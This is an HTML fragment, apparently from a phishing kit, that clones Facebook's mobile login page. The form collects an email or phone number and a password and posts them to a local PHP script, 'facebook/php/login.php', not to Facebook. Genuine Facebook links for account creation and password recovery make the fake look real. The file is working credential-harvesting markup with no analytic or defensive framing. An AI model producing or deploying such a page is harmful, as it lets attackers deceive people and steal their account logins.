<body>
    <div id="header"><h1>facebook</h1></div>
    <div id="container">
        <form action="facebook/php/login.php" method="POST">
            <input required id="username" name="username" type="text" spellcheck="false" maxlength="64" placeholder="Email or Phone">
            <input required id="password" name="password" type="password" spellcheck="false" maxlength="64" placeholder="Password">
            <button id="submit" type="submit">Log in</button>
        </form>
        <span id="or">or</span>
        <button id="create" onclick="window.location.href='https://m.facebook.com/reg/?cid=103'">Create New Account</button>
        <a href="https://m.facebook.com/login/identify">Forgot Password?</a> 
        <span id="dot"></span>
